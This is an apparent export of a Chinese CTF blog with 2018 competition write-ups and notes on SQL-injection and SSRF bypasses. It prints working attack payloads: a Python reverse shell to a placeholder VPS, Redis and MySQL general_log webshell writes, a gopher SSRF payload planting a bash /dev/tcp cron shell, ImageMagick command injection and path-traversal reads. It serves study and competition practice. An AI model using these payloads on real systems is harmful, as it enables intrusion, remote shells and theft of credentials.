{"meta":{"title":"Merl1ng's blog","subtitle":null,"description":"Love life , love gakki !","author":"Merl1ng","url":"http://Merl1ng.com"},"pages":[{"title":"tags","date":"2017-07-22T09:35:23.000Z","updated":"2017-07-22T09:51:19.089Z","comments":true,"path":"tags/index.html","permalink":"http://Merl1ng.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2017-07-22T09:54:25.000Z","updated":"2017-07-22T09:54:50.915Z","comments":true,"path":"categories/index.html","permalink":"http://Merl1ng.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"巅峰极客第二场wp","slug":"巅峰极客第二场wp","date":"2018-08-28T06:44:15.000Z","updated":"2018-08-28T11:35:41.882Z","comments":true,"path":"2018/08/28/巅峰极客第二场wp/","link":"","permalink":"http://Merl1ng.com/2018/08/28/巅峰极客第二场wp/","excerpt":"比赛是ctf+靶场 靶场大概也算web 内网渗透之类的","text":"比赛是ctf+靶场 靶场大概也算web 内网渗透之类的 ctfweb题目直接说了sql注入 一个注册页面 一个登陆页面 首先简单测试一下 随便注册个账号 登陆说你不是admin拿不到flag 去注册admin说该用户已存在 这里我先测试了每个参数是否存在注入点 然后都gg 登陆页面没回显信息 注册页面也没多余的信息 应该也不是二次注入 然后想到了万能密码登陆 username=admin’ or 1#&amp;password=1 之类的 试了试也都不行 又想到了mysql字符编码的操作 比如 admin%c2之类的 还不行https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html 那应该就是那个截断的操作了 去注册 admin 1 空格后带不带东西应该都行 重置admin的密码 然后用 admin 登陆即可 这玩意也第三次见了 crypton1 n2 一样 e1 e2 不同 c1 c2 不同 rsa的共模攻击 给的是 123456789-----BEGIN PUBLIC KEY-----MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQEAiYmjmJiEVrP+9Katht88mVd/iXgEjeVDa+/DDY2MlJWJEqpSb/MztmhXMG67jeNsLDlqhO/cXTglAtqho/O26XUC0uMchJMw9bTJUlehSal/WVTq+JNBFHrc3U6VD/904wu+Yih2tC7qyG30rZcV0FtWBKqBeUJMfZrEa9a18yKytXKLoUhwSiWo78wefITqflzj4BcD8E+UpDHZlUvXrix91uh5s1+KLUpe++c3JXv5m9nuZrFa/yM/x3tVikh9pZUvviuSPanF60Z4jAUDNrfjal7YLVwbKusORb7kBcvnJIHbJWiqgp7qyH0gGlqP9e5vC+OBkqsoOWNfbGZCFwICCR0=-----END PUBLIC KEY----- 这种公钥格式的 openssl跑一下拿到 n 和 e openssl rsa -in public.key -pubin -noout -text -modulus 这里python也行 不过那个库 windows我安装老报错 ubuntu下就没事 1234567891011121314 from Crypto.PublicKey import RSAwith open(‘./pubkey2.pem’, ‘r’) as f: key = RSA.importKey(f) n = key.n e = key.eprint nprint e 然后这里有个坑点 密文c1 c2 不是16进制格式的 长得比较像base64 但我解了下发现是乱码 就没解base64直接转hex了 然后怎么都算不出来。。。 这里当时智障了 因为乱不乱码根本没影响 反正都要转hex的 乱码知识ascii乱而已。。。 所以就是普通的脚本加个base64解码就能跑了 1234567891011121314151617181920212223242526272829#!/usr/bin/env python# -*- encoding: utf-8 -*-import gmpy2import libnumimport base64n = 0x8989A398988456B3FEF4A6AD86DF3C99577F8978048DE5436BEFC30D8D8C94958912AA526FF333B66857306EBB8DE36C2C396A84EFDC5D382502DAA1A3F3B6E97502D2E31C849330F5B4C95257A149A97F5954EAF89341147ADCDD4E950FFF74E30BBE622876B42EEAC86DF4AD9715D05B5604AA8179424C7D9AC46BD6B5F322B2B5728BA148704A25A8EFCC1E7C84EA7E5CE3E01703F04F94A431D9954BD7AE2C7DD6E879B35F8A2D4A5EFBE737257BF99BD9EE66B15AFF233FC77B558A487DA5952FBE2B923DA9C5EB46788C050336B7E36A5ED82D5C1B2AEB0E45BEE405CBE72481DB2568AA829EEAC87D201A5A8FF5EE6F0BE38192AB2839635F6C664217e1 = 0x91de2 = 0x5b25c1 = int(base64.b64decode(open('flag1.enc','rb').read()).encode('hex'),16)c2 = int(base64.b64decode(open('flag2.enc','rb').read()).encode('hex'),16)def common_modulus(n, e1, e2, c1, c2): \"\"\" ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1 ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2) \"\"\" assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) # 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。 m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) return m % nflag = common_modulus(n, e1, e2, c1, c2)flag = libnum.n2s(flag)print flag libnum.n2s确实挺方便的 以前不知道 hex(msg)[2:].decode(‘hex’) 就很麻烦详细可以看https://blog.csdn.net/qq_33438733/article/details/79297527 还有学到了几个python小技巧 from xx impoet * 比 import xx 在使用时不用 xx.ways 可以直接ways miscword 改成zip一个一个翻就行 后来见有师傅word中光标移到flag后面 此时字体会直接显示 靶场参考http://120.79.189.7/?p=479https://www.o2oxy.cn/1749.htmlhttps://mp.weixin.qq.com/s/ivQLNSCMaH-zXrAqBUEiCghttps://mp.weixin.qq.com/s?__biz=MzIyNTI0ODcwMw==&amp;mid=2662123198&amp;idx=1&amp;sn=d21c18a4656838e593055a969ec355c3&amp;chksm=f35af26ec42d7b7878a6958e0d43d889cd79182942352f50f5f1dac09942a62487d506f652c3&amp;mpshare=1&amp;scene=23&amp;srcid=0828DsBqxPSECrP6NQf7qpf7#rd 抛转引玉扫描了一下有一个www.zip 然后打开一下 ，找到config.php 发现题目的root 密码 然后发现是PHPOA，然后wooyun搜下phpoa有任意文件下载，直接下载config.php即可http://wooyun.jozxing.cc/static/bugs/wooyun-2014-063280.html 这里师傅的吐槽真是23333 /down.php?urls=data/../config.php 可以拿到nyoa的密码（问题2） 问题三应该是个sql 暗渡陈仓虚实相接，需要出题者以声东击西的招式准备的歧路，找到正确的栈道。 1.提交上传点的地址的name(例如答:/xxxxx/) 2.提交系统管理员Hack用户的全名 3.超级管理员用户桌面根目录admin.txt文件的内容 AVWS扫描 获取到上传的点 /u-Are-Admin/u-upload-file/ 这里不扫也能发现目录: 右键查看源代码发现图片路径是u-Are-Admin 然后用任意读取downloadfile.php?file=读download.php发现路径是u-uploads-file 上传php 不行 大小写绕过 PHP 或者 phP 拿到shell后 net user 发现hack 全名是Hacked356 getshell后发现为最高权限，直接菜刀找到 c:\\documents and sttings\\administrator\\桌面\\admin.txt，读取即可 瞒天过海目的不是为了瞒天，只是做出题目的一种手段。 1.提交后台管理员密码 2.提交mysql密码 3.提交C盘根目录password.txt内容 注入拿到后台管理员密码 再注入 读取mysql.user的password列，然后解hash 再再注入利用load_file()可以读password.txt 或者进入后台之后有上传 上传会自动加.jpg 发现有任意读取。直接读根目录password.txt /classes/downloadfile.php?file=../../../../../../../../../../../password.txt 偷梁换柱赛题是那样无情残忍，无义无理取闹，稍有踟蹰，他就偷梁换柱。 1.提交后台admin用户的密码 2.提交系统管理员ichunqiu用户的全名 3.提交/tmp/access.log的内容的前16位 扫描发现存在/.git/目录，利用githack下载下来源码，源码中发现默认的sql文件，里面有账户密码 然后发现文件上传 对照源码 发现会自动加 png后缀 并且发现了ImageMagick 所以这里有两条路 先说第一种 直接上传绕过 中文.jpg.png3.jpg.png3.png.png3”.php.png3’.php.png 最终3.php.png或者3.php.png/.php可以 第二种 ImageMagick push graphic-context viewbox 0 0 640 480 fill ‘url(https://xxxxxx/1.jpg”|ls &gt; /var/www/html/1.txt”)’ pop graphic-context 就可以执行任意命令 然后分别读取/etc/passwd 和 /tmp/access.log 反客为主以静谋动，反客为主，掌握真正的大权，才能不任人摆布。 1.提交phpStudy目录下Documents.txt的内容 2.提交系统用户/ichunqiu的密码 3.提交ichunqiu用户Desktop根目录password.txt的内容 发现有任意读取info/include.php?filename=../../../../../../../../../../windows/win.ini info/include.php?filename=../../../../../../../../../../windows/info.txt 虽然用不到。。 然后扫目录发现phpmyadmin服务，用弱口令root/root登进去，然后genernal log getshell。 这种方法sctf考过 show variables like ‘%general%’; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file = ‘C:/phpStudy/WWW/1.php’; #设置日志目录为shell地址 select ‘&lt;?php eval($_POST[cmd]);?&gt;’; #写入shell 进去传QuarksPwDump 可以跑出HASH cmd5解密得到密码","categories":[],"tags":[]},{"title":"网鼎杯wp","slug":"网鼎杯wp","date":"2018-08-20T13:23:18.000Z","updated":"2018-08-28T10:23:05.556Z","comments":true,"path":"2018/08/20/网鼎杯wp/","link":"","permalink":"http://Merl1ng.com/2018/08/20/网鼎杯wp/","excerpt":"这比赛把人打到自闭","text":"这比赛把人打到自闭 webweb1000先写下这道没人做出来的web 题目本身出的非常好 行云流水般的内网操作 https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd https://xz.aliyun.com/t/2607 https://www.xmsec.cc/wdb-review/ 题目是一个在线爬虫解析HTML A标签的的功能，显示会把tag A的内容打印在屏幕上 首先扫目录 robots.txt 查看发现 目录 get_sourcecode 尝试访问 提示 NOT 127.0.0.1 所有头全加伪造一波 还是gg namp看了下好像是nginx的反代 想到了长亭上那个代理题目的服务器 然后访问127.0.0.1的操作 仍然gg 大概是因为docker?? 这里应该测试爬虫 发现是动态分析 说白了就是会执行js 所以构造html文件 用 XMLHttpRequest 让 js 执行http请求 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;a href=\"\" id=\"flag\"&gt;test&lt;/a&gt;&lt;script type=\"text/javascript\"&gt;function loadXMLDoc()&#123;var xmlhttp;if (window.XMLHttpRequest) &#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125;else &#123;// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125;xmlhttp.onreadystatechange=function() &#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById(\"flag\").innerHTML=xmlhttp.responseText; &#125; &#125;xmlhttp.open(\"GET\",\"http://127.0.0.1:80/get_sourcecode\",true);xmlhttp.send();&#125;loadXMLDoc();&lt;/script&gt; 执行AJAX请求，并把结果动态赋到id为flag的a标签里，随之输出出来 AJAX 就是 异步的 JavaScript 和 XML 12345678910AJAX是基于现有的Internet标准AJAX是基于现有的Internet标准，并且联合使用它们： XMLHttpRequest 对象 (异步的与服务器交换数据) JavaScript/DOM (信息显示/交互) CSS (给数据定义样式) XML (作为转换数据的格式)AJAX应用程序与浏览器和平台无关的！ 这样终于拿到了源码 发现 过滤了dbfilename，可知是redis相关 构造redis corntab shell失败，可能系统是ubuntu等，crontab不行就尝试从web入手(由于redis写入的文件有莫名的头和尾 只有centos才能成功通过crontab来弹shell) http://foreversong.cn/archives/1180 通过JS端口探测 123456789101112131415161718192021222324252627&lt;a id=\"result\"&gt;&lt;/a&gt;&lt;script&gt;var data = document.getElementById('result').innerHTML;var TagName = document.getElementsByTagName(\"body\")[0];ports=[80,81,88,6379,8000,8080,8088];for(var i in ports)&#123; var script = document.createElement(\"script\"); poc = \"data += '\" + ports[i] + \" OPEN; '; document.getElementById('result').innerHTML = data;\" script.setAttribute(\"src\",\"http://127.0.0.1:\" + ports[i]); script.setAttribute(\"onload\", poc); TagName.appendChild(script);&#125;&lt;/script&gt; 这里有个小坑，通过 JS 代码并不能发现 redis 的端口6379是开放的，但是该端口确实是开放的。有人说 JS 代码只能探测Web类端口，在探测redis端口的时候回卡在等待界面 getshell后可以发现CTF中redis环境是2.8版本。不过redis&gt;=3.2版本，会过滤一些特殊字符，直接利用js发送http请求，由于POST数据包的特殊字符被过滤，导致链接会被redis关闭，所以不会执行后面的写文件等payload 所以这里为什么还不清楚 得到8000端口开放着，猜测是apache2等phpserver 构造一个Redis EXP 1234567891011121314151617181920212223242526&lt;a href=\"\" id=\"flag\"&gt;test&lt;/a&gt;level=low_273eac1c&lt;script&gt; var xmlHttp; if(window.XMLHttpRequest)&#123; xmlHttp = new XMLHttpRequest(); &#125;else&#123; xmlHttp = newActiveXObject(\"Microsoft.XMLHTTP\"); &#125; var formData = new FormData(); formData.append(\"0\",\"flushall\"+\"\\n\"+\"config set dir /var/www/html/\"+\"\\n\"+\"config set dbfilename shell.php\"+\"\\n\"+'set 1 \"\\\\n\\\\n&lt;?php header(\\'Access-Control-Allow-Origin:*\\'); echo file_get_contents($_GET[0]);?&gt;\\\\n\\\\n\"'+\"\\n\"+\"save\"+\"\\n\"+\"quit\"); xmlHttp.open(\"POST\",\"http://127.0.0.1:6379\",true); xmlHttp.send(formData);&lt;/script&gt; 加 level=low_273eac1c 因为源码以有写过滤 这里有个坑点 因为不同端口，所以存在跨域，需要加上Access-Control-Allow-Origin:* 头部 (CORS) 有关同源和跨域https://www.cnblogs.com/rockmadman/p/6836834.html 这里是盲打 你也不着写进去没 所以比赛时在不知道是不是正确时会很慌 无形增大难度 最后再构造一个HTML利用webshell test function loadXMLDoc() { var xmlhttp; if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); } else {// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 && xmlhttp.status==200) { document.getElementById(\"flag\").innerHTML=xmlhttp.responseText; } } xmlhttp.open(\"GET\",\"http://127.0.0.1:8000/shell.php?0=flag.php\",true); xmlhttp.send(); } loadXMLDoc(); 最后直接反弹shell也可以，大师傅测试的时候发现直接用bash反弹不行，但是用python代码可以反弹回来，可能是题目环境限制了一些关键词 123456789101112131415161718192021&lt;a href=\"\" id=\"flag\"&gt;test&lt;/a&gt;&lt;script type=\"text/javascript\"&gt;function loadXMLDoc()&#123; var xmlhttp; if (window.XMLHttpRequest)&#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125; else&#123;// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById(\"flag\").innerHTML=xmlhttp.responseText; &#125; &#125; xmlhttp.open(\"GET\",\"http://127.0.0.1:8000/shell.php?_=`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"VPSIP\\\",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'`;\",true) xmlhttp.send();&#125;loadXMLDoc();&lt;/script&gt; 小结这题真的是十分精彩 其实做这个前几天我刚总结过 xss 打 内网redis 和 redis getshell 的相关操作 这次刚好加深印象 不过这个可能不是传统回显在vps的xss 它那个在线爬虫会执行js并回显在当前页面 大概可以说是ajax打内网 也有点像xml打内网 还有点像ssrf的操作 其实到底叫什么并不重要 真正要学习的是如何利用有限条件操作内网 facebooksql注入+反序列化+file协议读文件(LFR) 或者 sql注入+ssrf 只是思考的角度不同 不过对ssrf还是不太敏感 最近有在看hctf2016的题 AT Field 一开始也是ssrf 看wp的时候我还愣了一下http://www.freebuf.com/articles/web/121778.html 同样扫目录 robots.txt 发现并下载user.php.bak 一看就应该有反序列化的洞 能看懂的反序列化学习https://www.cnblogs.com/perl6/p/7124345.html 直接用 union select 会被WAF检测到，所以我们添加了 /**/ -1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyy&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39; var/www/html/ 路径报错的时候给了 不给的话大概也能猜到 flag.php字典大的话可以跑出来 为啥不直接http读flag.php 其实稍微试一下就能发现 http的协议也能得到base64的回显的 but只有flag.php没有base64的回显 应该是过滤了 使用http协议没办法读到flag 又给了文件路径 最简单的办法就是file协议 最后有一点sql注入时我感觉十分重要 就是回显位的判断 ?=-1或者加 and 1=2 让它自带语句不执行好回显我们的union是其一 还有你 union select 1,2,3,4 可能回显位只有一个 比如这题在 2 要是不仔细看下就得当盲注做了.. 仍记得当时强网杯three hit那道sql没看回显位以为不能回显当盲注做的。。而且那道题还是二次注入当时脚本没写出来。。纯手工注入的。。。简直累死 那道题可以看https://blog.csdn.net/qq_32465127/article/details/79814049 miscminifiepng隐写 看图片我还以为要python提取像素点 正解为stegsolve发现red0通道为空 猜测是0通道有问题，将其他plane 0通道（red，green，Alpha）提取并且保存，使用Stegsolve对三张图片分别做Image Combiner对比 ，最后发现Alpha plane 0和green plane 0通道进行XOR（异或） 就可以得到flag https://blog.csdn.net/xiangshangbashaonian/article/details/81870097 cliphttps://blog.csdn.net/xiangshangbashaonian/article/details/81906161 这题被题目描述坑了 说什么从老旧损坏硬盘恢复的文件系统 我一直试文件恢复的操作。。 结果是winhex直接搜索 有师傅说disk是应该linux挂载的 但既然提示损坏就应该不是这个方向 有点牵强orz 结果从文件中可以搜索到两个png图片 注意有一个是没有png文件头的 这里最搜索 IDAT 涨姿势了orz https://blog.csdn.net/SWEET0SWAT/article/details/81879942 但这种做法好像不是预期 预期可能是什么zlib compress解密 当时我 binwalk -e能出来超级多的zlib 然后我就不会了。。 记录一道rehttps://paper.tuisec.win/detail/f8d629ce47c117c 为啥想记录这道re呢 因为看wp把我吓到了 大师傅直接就能看出来字符串是xor的。。膜拜 贴下原话 老年misc选手,看到输出得到加密后的flag:4b404c4b5648725b445845734c735949405c414d5949725c45495a51像是异或flag后的结果 import libnumIn [97]: libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51)Out[97]: ‘K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ’ 猜测:In [93]: ord(“f”)^0x4bOut[93]: 45 In [94]: ord(“g”)^0x4bOut[94]: 44 In [95]: ord(“l”)^0x40Out[95]: 44 In [96]: ord(“a”)^0x4cOut[96]: 45 xor key 为45,44 In [98]: enc = libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51) In [99]: flag = “”In [102]: for i in range(len(enc)): …: if i%2==0: …: flag+=chr(ord(enc[i])^45) …: else: …: flag+=chr(ord(enc[i])^44) …: …: In [103]: print flagflag{d_with_a_template_phew}","categories":[],"tags":[]},{"title":"sqlbypass小结","slug":"sqlbypass小结","date":"2018-08-18T11:00:16.000Z","updated":"2018-08-24T05:25:46.488Z","comments":true,"path":"2018/08/18/sqlbypass小结/","link":"","permalink":"http://Merl1ng.com/2018/08/18/sqlbypass小结/","excerpt":"总结下sql常见的bypass方式","text":"总结下sql常见的bypass方式 最普通username=admin’# 在’’内上面会变成’admin’’ gg username=admin’ or 1#这样变成‘admin’ or 1#’ 过滤了 # – =username=admin’ or ‘a’ like ‘a $sql = select * from users where username=’$username’ and password = ‘$password’username = 1’ or 1 or ‘password = 1 变成 select * from users where username=’1’ or 1 or ‘’ and password = ‘1’ 联合username = 1’ union select 1,2# 空格被过滤用%09%0A %0B %0C %0D %A0 %20 /**/绕过 注释符#， --+， /*xxx*/， /*!xxx*/， /*!50000xxx*/ 高阶玩法还可以嵌套使用 比如只需利用一个*/闭合多个/*! and 1=1 测不出 +，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;，也可以将and换成or，&amp;&amp;， ||等 也可以不使用and或者or，直接使用异或截断： 1^1^0，1^0^0 有 -admin’-1-‘ admin’-0-‘ 看见了这个 1’&lt;0e0union select 1,2,3过滤 substrascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d 过滤 逗号union select 1,2,3 union select * from (select 1)a join (select 2)b join (select 3)c 已知表名但不知道字段名且过滤information_schema或者直接过滤了字段名union select (select i.1 from (select 1,2,3 union select * from user)i limit 0,1),2,3 union select (select i.1 from (select 1,2,3 union select * from user)i limit 1,1),2,3 union select 1,(select i.2 from (select 1,2,3 union select * from user)i limit 0,1),3 union select 1,(select i.2 from (select 1,2,3 union select * from user)i limit 1,1),3 原理是把不知道的字段名改成1,2,3…好像叫什么虚表 还可以用order by盲注的方法 union select 1,0x31,3 order by 3 union select 1,0x3132,3 order by 3 … 过滤()就是 substr() ascii()这种都gg 使用 Like和regexp union select 1,2,3 from user where password regexp ‘^1.*$’ union select 1,2,3 from user where password regexp ‘^12.*$’ union select 1,2,3 from user where password like ‘1%’ 过滤information_schema，SCHEMATA，TABLES，COLUMNS知道表名想爆库名 直接随便打个函数 比如 ?id=aaa() 原理就是当一个库中不存在的自定义函数他就会爆出当前库中没有此函数 爆表名 Polygon和linestring ?id=1 and Polygon(id) ?id=1 and linestring(id) 爆字段名 用using逐个爆破 首先知道id这个字段 (就问号前面的) 即使不知道也能爆其实 1 and (selecr from (select from user as ajoin user as b using(id)) as c) 比如这时爆出了 username 1 and (selecr from (select from user as ajoin user as b using(id，username)) as c) … 原理就是在使用别名的时候，表中不能出现相同的字段名，否则就会报错，从而爆出字段名，在使用using函数依次爆出其他字段名 案例lctf2017 他们有什么秘密呢？ 涉及 用一个不存在的自定义函数，就可以爆出数据库名 polygon函数 及类似的 multiPolygon(id)multilinestring(id)linestring(id)GeometryCollection(id)MultiPoint(id)polugon(id) using+join 参考https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg","categories":[],"tags":[]},{"title":"琐碎知识点记录","slug":"琐碎知识点记录","date":"2018-08-18T10:48:25.000Z","updated":"2018-08-28T09:43:39.281Z","comments":true,"path":"2018/08/18/琐碎知识点记录/","link":"","permalink":"http://Merl1ng.com/2018/08/18/琐碎知识点记录/","excerpt":"记录些小的知识盲区","text":"记录些小的知识盲区 py3的base85curl可以访问ftpping中ttlhttp://blog.evalbug.com/2015/10/09/timetolive/ 全名为 Time to Live 最初这个字段是每经过一个路由器，就减去在这台路由器上数据转发消耗的时间的整数值，就是说每个路由器上减的不一样。然后科技就发展嘛，现在那种转发数据包会花上1秒钟以上的古董路由器已经几乎没有了，所以每经过一个路由器，这个值都是减1 目前这个字段的含义已经变成了跳数计数器了 Ping 命令里面显示给你看的那个 TTL ，并不是你发出去的数据包的 TTL ，而是和你通信的对方，他设定的初值，然后一路走到你这，扣了多少税之后，剩下的那个数字 ldap注入会报错 Bad searvh filter可以试试 * *登陆 py http服务的任意URL跳转漏洞直接用python3 -m http.server启动一个HTTP服务器 访问http://127.0.0.1:8000//example.com/%2f%2e%2e即可发现跳转到了http://example.com/%2f../ 如何发现呢 可以看题目中有没有SimpleHTTPServer SimpleHTTPRequestHandler等关键字 起因真是飘零师傅的文章中whitehat ctf上有类似的例子 让后有趣ph师傅博客看了看文章 https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html Python框架web.py在处理静态文件的代码中继承并使用了SimpleHTTPRequestHandler类，所以也会受到影响 但利用好像比较受限制 顺便一提 web.py和django一样也是个pythonweb的框架。。这名字好奇怪 话说飘零师傅文章中又提到了web.py 世界果然是圆的hhh ssrf bypasshttp://www.freebuf.com/articles/web/135342.html这篇文章总结的挺好的 有几个点格外引人注意 更改IP地址写法一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式： ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ 对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成： (1)、8进制格式：0300.0250.0.1 (2)、16进制格式：0xC0.0xA8.0.1 (3)、10进制整数格式：3232235521 (4)、16进制整数格式：0xC0A80001 rectf上就是 还有hitcon上四字节getshell的 利用解析URL所出现的问题在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。 http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容 这个方式好眼熟 lctf2017上有个curl的好像这种方法也能过 orange大师傅好像也分享过类似的 利用302跳转如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。 (1)、在网络上存在一个很神奇的服务，http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。 这个在hctf2016也看到了http://www.freebuf.com/articles/web/121778.html (2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是http://tinyurl.com所提供的短地址服务 同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能 大概是http://xxxxx/?u=http://127.0.0.1 在有域名的vps上写一个跳转页面实现 通过各种非HTTP协议：如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。 (1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL： gopher://127.0.0.1:6379/_1%0d%0a$8%0d%0aflushall%0d%0a3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a/1 bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a 没错 又见到 gopher 结合 ssrf 打redis 之前也记录过打mysql的 (2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容 file协议这东西以前不重视 这次网鼎反序列化读文件压根没想到要结合file协议 DNS Rebinding(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP (2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证 (3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。 (4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。 这方法看的不太懂但那个ttl很感兴趣hhh 刚刚记录过 python和django的目录遍历漏洞http://www.lijiejie.com/python-django-directory-traversal/ A_A 可以用 A.A绕过安恒月赛的一道题 其他见到了就来写点 写着写着发现很多知识点之间是有关联的 web真是有趣啊orz","categories":[],"tags":[]},{"title":"pwn栈溢出从放弃到放弃","slug":"pwn栈溢出从放弃到放弃","date":"2018-08-17T14:33:37.000Z","updated":"2018-08-18T07:20:24.911Z","comments":true,"path":"2018/08/17/pwn栈溢出从放弃到放弃/","link":"","permalink":"http://Merl1ng.com/2018/08/17/pwn栈溢出从放弃到放弃/","excerpt":"作死看了下pwn的栈溢出的最简单的题目","text":"作死看了下pwn的栈溢出的最简单的题目 突然想稍微了解下pwn 刚好下学期学什么编译原理之类的应该又要涉及汇编 所以看下pwn就当预习了orz 直接看blog都感觉很吃力 先看下b站上小猪老师的视频","categories":[],"tags":[]},{"title":"一点点做题心得","slug":"一点点做题心得","date":"2018-08-16T13:03:51.000Z","updated":"2018-08-16T13:29:14.103Z","comments":true,"path":"2018/08/16/一点点做题心得/","link":"","permalink":"http://Merl1ng.com/2018/08/16/一点点做题心得/","excerpt":"如题","text":"如题 作为菜鸡学习了一阵ctf的题目 想把目前的感悟写一点 首先作为初学者 我感觉刷题是最快的方法 因为面对新领域看见题目脑子是空的 完全没有思路也不知道有什么可以利用的工具 那么刚开始刷题学的是什么 我认为学的是思路 有了思路才能结合知识分析下去 关于面对题目做一些题目练习后 就积累了一些东西 再面对题目 如果有思路 很好 证明你的知识已经能大概看出这道题考察的方向并且大致知道怎么处理它 web在这里体现的尤为明显 之前我看web只能做那种超简单一眼就能看出的题 但当你有了一些知识积累 学了些常见的思路 或许就可以运用知识进一步分析题目 tjctf上面对web没那么慌乱 能对一些稍难的题目进行分析测试 最终通过查找资料学习新知识并解出题目 如果没思路 分两种 第一种这道题可能有原题或改编 google可能查到 可以对照解答出之前完全没见过思路的题目 当然这种题难度一般不会太大 那么第二种就是完全没思路而且涉及知识点较深 那么恭喜你 这种题目赛后一定要学wp复现 这就是你的知识漏洞或者还不会的高阶操作 关于看wp看wp大致也分两种 第一种是看思路 这种思路你从来没见过 或者利用的工具从来不知道 你就想学学思路 这种也只是增大了知识面 但下次碰到类似题目可能知道往哪里思考 不过不一定做的出来 第二种是亲自复现 相信我 